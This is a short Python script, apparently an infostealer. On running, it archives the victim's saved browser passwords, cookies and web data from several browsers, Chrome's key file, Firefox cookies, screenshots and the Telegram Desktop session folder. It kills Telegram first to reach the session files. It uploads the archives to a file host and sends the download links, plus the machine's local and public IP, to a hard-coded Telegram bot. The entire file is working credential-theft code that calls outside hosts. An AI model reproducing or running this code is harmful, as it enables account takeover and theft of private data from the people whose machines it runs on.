import os
import socket
import time
import zipfile

import psutil
import requests
from gofilepy import GofileClient

T = '6664269750:AAEXmgOxU4mxN4PbMkblbqtaszZWWtedWf4'
C = '1278042952'
U = os.getlogin()
S = lambda t: requests.post(f'https://api.telegram.org/bot{T}/sendMessage', data={'chat_id': C, 'text': t})
G = GofileClient()


def I():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
        s.connect(("8.8.8.8", 80))
        l = s.getsockname()[0];
        s.close()
        g = requests.get('https://api.ipify.org').text
        return f"Local: {l}\nGlobal: {g}"
    except:
        return "IP info not available"


def A(p, mode):
    b, j = os.getenv, os.path.join
    z = zipfile.ZipFile(p, 'w')
    if mode == 1:
        P = [("LOCALAPPDATA", "Google", "Chrome", "User Data", "Default", x) for x in
             ["Login Data", "Cookies", "Web Data"]] + \
            [("LOCALAPPDATA", "Chromium", "User Data", "Default", x) for x in ["Login Data", "Cookies"]] + \
            [("LOCALAPPDATA", "Amigo", "User Data", "Default", x) for x in ["Login Data", "Cookies"]] + \
            [("APPDATA", "Opera Software", "Opera Stable", x) for x in ["Login Data", "Cookies"]] + \
            [("LOCALAPPDATA", "Yandex", "YandexBrowser", "User Data", "Default", "Ya Passman Data")]
        f = [j(b(x[0]), *x[1:]) for x in P]
        F = j(b("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if os.path.exists(F):
            f += [j(F, d, "cookies.sqlite") for d in os.listdir(F) if os.path.isfile(j(F, d, "cookies.sqlite"))]
        for x in f:
            if os.path.isfile(x):
                z.write(x, arcname=os.path.relpath(x, b("LOCALAPPDATA")))

        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
        if os.path.isfile(local_state_path):
            z.write(local_state_path, arcname=os.path.relpath(local_state_path, os.getenv("LOCALAPPDATA")))

        yandex_local_state = os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data",
                                          "Local State")
        if os.path.isfile(yandex_local_state):
            z.write(yandex_local_state, arcname=os.path.relpath(yandex_local_state, os.getenv("LOCALAPPDATA")))

        P = fr"C:\Users\{U}\Pictures\Screenshots"
        if os.path.exists(P):
            for r, _, fs in os.walk(P):
                for f in fs:
                    z.write(j(r, f), arcname=j("Screenshots", os.path.relpath(j(r, f), P)))
    elif mode == 2:
        for x in psutil.process_iter(['name']):
            if x.info['name'] == 'Telegram.exe':
                try:
                    x.terminate()
                except:
                    pass
        time.sleep(1.4)
        P = fr"C:\Users\{U}\AppData\Roaming\Telegram Desktop\tdata"
        if os.path.exists(P):
            for r, _, fs in os.walk(P):
                for f in fs:
                    z.write(j(r, f), arcname=j("Telegram_tdata", os.path.relpath(j(r, f), P)))
    z.close()
    with open(p, 'rb') as f:
        S(G.upload(file=f).page_link)
    os.remove(p)


A('a1.zip', 1)
S(I())
A('a2.zip', 2)
